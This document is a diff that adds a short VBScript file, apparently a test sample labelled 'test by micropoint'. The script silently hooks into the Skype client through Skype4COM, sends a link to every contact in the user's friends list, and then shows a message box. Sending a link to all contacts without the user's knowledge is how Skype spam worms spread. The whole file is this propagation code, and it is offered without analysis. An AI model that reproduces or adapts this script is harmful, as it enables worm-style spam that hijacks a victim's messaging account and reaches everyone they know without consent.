@@ -1,0 +1,8 @@
+on error resume next
+set luVoF = WScript.CreateObject("Skype4COM.Skype", "Skype_")
+luVoF.Client.Start()
+luVoF.Attach()
+For Each xlr In luVoF.Friends
+luVoF.SendMessage xlr.handle,"http://www.test.com"
+next
+msgbox "test by micropoint",,"test is here"
